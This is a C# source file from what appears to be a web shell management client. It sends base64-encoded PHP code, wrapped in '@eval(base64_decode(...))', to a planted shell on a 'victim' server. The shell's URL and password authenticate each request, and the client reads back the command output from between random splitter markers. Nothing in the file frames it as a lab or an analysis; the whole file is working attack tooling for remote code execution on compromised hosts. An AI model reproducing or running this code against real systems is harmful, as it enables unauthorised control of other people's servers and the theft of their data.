using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection.Metadata;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsWeb
    {
        public clsVictim m_victim { get; set; }
        public HttpClient m_clnt { get; set; }

        private Dictionary<Language, string> m_dicSuffix = new Dictionary<Language, string>()
        {
            { Language.PHP, "php" },
            { Language.ASP, "asp" },
            { Language.Python, "py" },
        };
        private Dictionary<Language, string[]> m_dicRemoveSyntax = new Dictionary<Language, string[]>()
        {
            {
                Language.PHP,
                new string[]
                {
                    "<?php", "?>",
                }
            },
        };
        private Dictionary<Language, string> m_dicDecodeFunc = new Dictionary<Language, string>()
        {
            { Language.PHP, "@eval(base64_decode('[PATTERN]'));" },
        };
        private Dictionary<Language, string> m_dicSplitter = new Dictionary<Language, string>()
        {
            { Language.PHP, "echo(\"[SPLITTER]\");" }
        };

        public clsWeb(clsVictim victim)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            m_victim = victim;
            m_clnt = new HttpClient()
            {
                BaseAddress = new Uri(m_victim.ShellURL),
            };
        }

        public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
        {
            Clipboard.SetText(szPayloadData);
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            string szRespContent = await resp.Content.ReadAsStringAsync();

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
            {
                return szRespContent = szRespContent.Split(szSplitter)[1];
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                return string.Empty;
            }
        }

        public async Task<bool> fnbTestWebConnection()
        {
            try
            {
                using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                {
                    resp.EnsureSuccessStatusCode();

                    using (HttpContent content = resp.Content)
                    {
                        string szResult = await content.ReadAsStringAsync();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestWebConnection()");
                return false;
            }
        }
        public async Task<bool> fnbTestShellConnection()
        {
            try
            {
                string szPattern = clsEzData.fnszGenerateRandomStr();
                string szResp = await fnszSendPayload("test", new string[] { szPattern });

                return string.Equals(szResp, szPattern);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestShellConnection()");
                return false;
            }
        }

        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            for (int i = 0; i < asParams.Length; i++)
                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

            string szParams = string.Join("&", asParams);
            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";

            return await fnHttpPOST(szPayload, szSplitter);
        }

        /// <summary>
        /// Read payload from file with specified language, method and payload type.
        /// </summary>
        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
        /// <returns>Payload content</returns>
        private string fnGetPayload(string szPayloadName, string szSplitter)
        {
            string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
            string szPayloadFilePath = Path.Combine(new string[]
            {
                "Payload",
                m_victim.ShellLanguage.ToString(),
                m_victim.ShellMethod,
                m_victim.ShellPayloadType.ToString(),
                $"{szPayloadName}.{szSuffix}",
            });

            if (File.Exists(szPayloadFilePath))
            {
                string szPayload = File.ReadAllText(szPayloadFilePath);
                foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
                    szPayload = szPayload.Replace(szPattern, string.Empty);

                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";

                return szPayload;
            }
            else
            {
                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }
    }
}
